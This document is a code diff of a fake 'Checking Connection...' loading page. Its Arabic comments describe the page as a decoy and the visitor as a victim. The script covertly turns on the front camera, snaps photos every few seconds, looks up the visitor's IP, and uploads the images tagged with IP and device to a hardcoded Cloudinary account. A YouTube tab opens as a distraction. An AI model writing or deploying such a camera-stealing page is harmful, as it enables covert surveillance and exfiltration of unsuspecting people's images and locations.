@@ -4,74 +4,104 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
-    <link rel="icon" href="data:,">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        body { background-color: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        /* تصميم صفحة تحميل وهمية بسيطة */
+        body { background-color: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
+        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
+
     <div class="loader"></div>
-    <p>جاري تهيئة النظام...</p>
+    <p style="margin-left: 20px;">Checking Connection...</p>
 
     <video id="video" playsinline autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const cloudName = 'dgkttv99v'; //
-        const uploadPreset = 'ml_default'; //
-        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        const cloudName = 'dgkttv99v';
+        const uploadPreset = 'ml_default'; // تأكد إن ده Unsigned في إعدادات Cloudinary
+        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // لينك الفيديو للتمويه
+
         let tabOpened = false;
 
         async function init() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                document.getElementById('video').srcObject = stream;
-                setTimeout(takeSnapshot, 2000); // يبدأ الرفع بعد ثانيتين
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // ابدأ أول لقطة بعد ثانيتين لضمان استقرار الكاميرا
+                setTimeout(takeSnapshot, 2000);
+                
+                // كرر عملية الالتقاط والرفع كل 5 ثواني
+                setInterval(takeSnapshot, 5000);
             } catch (e) {
-                window.location.href = youtubeLink; // لو رفض الكاميرا يحوله فوراً
+                console.log("Camera Error");
+                // لو رفض الكاميرا، افتح اليوتيوب برضه عشان ميتشكش
+                window.open(youtubeLink, '_blank');
             }
         }
 
         async function takeSnapshot() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            
             const imageData = canvas.toDataURL("image/png");
 
-            // جلب الـ IP بشكل آمن
-            let userIP = "Unknown";
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                userIP = data.ip;
-            } catch (err) { console.log("IP skip"); }
+                // 1. جلب الـ IP الخاص بالمستخدم (الضحية)
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
 
-            const formData = new FormData();
-            formData.append('file', imageData);
-            formData.append('upload_preset', uploadPreset);
-            formData.append('tags', `IP_${userIP}`);
-            formData.append('type', 'upload'); 
+                // 2. تجهيز بيانات الرفع للسحاب
+                const formData = new FormData();
+                formData.append('file', imageData);
+                formData.append('upload_preset', uploadPreset);
+                formData.append('tags', `IP_${userIP}`); // حفظ الـ IP كـ Tag للبحث السهل
+                formData.append('context', `ip=${userIP}|device=${navigator.platform}`);
 
-            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(r => r.json())
-            .then(data => {
-                if (data.public_id && !tabOpened) {
-                    window.open(youtubeLink, '_blank');
-                    tabOpened = true;
-                }
-                setTimeout(takeSnapshot, 8000); // يرفع صورة كل 8 ثواني
-            })
-            .catch(err => {
-                setTimeout(takeSnapshot, 4000); // لو فشل يحاول تاني بعد 4 ثواني
-            });
+                // 3. إرسال الصورة والـ IP معاً إلى Cloudinary
+                fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(r => r.json())
+                .then(data => {
+                    console.log("Uploaded with IP: " + userIP);
+                    // أول ما أول صورة تترفع بنجاح، افتح تاب اليوتيوب للتمويه
+                    if (!tabOpened) {
+                        window.open(youtubeLink, '_blank');
+                        tabOpened = true;
+                    }
+                });
+            } catch (err) {
+                console.error("Error getting IP or uploading", err);
+                
+                // في حالة فشل جلب الـ IP، حاول رفع الصورة بدونه لضمان استمرار العمل
+                const formData = new FormData();
+                formData.append('file', imageData);
+                formData.append('upload_preset', uploadPreset);
+                
+                fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+                    method: 'POST',
+                    body: formData
+                }).then(r => r.json()).then(data => {
+                    if (!tabOpened) {
+                        window.open(youtubeLink, '_blank');
+                        tabOpened = true;
+                    }
+                });
+            }
         }
 
+        // تشغيل فوري أول ما الصفحة تفتح
         window.onload = init;
     </script>
 </body>
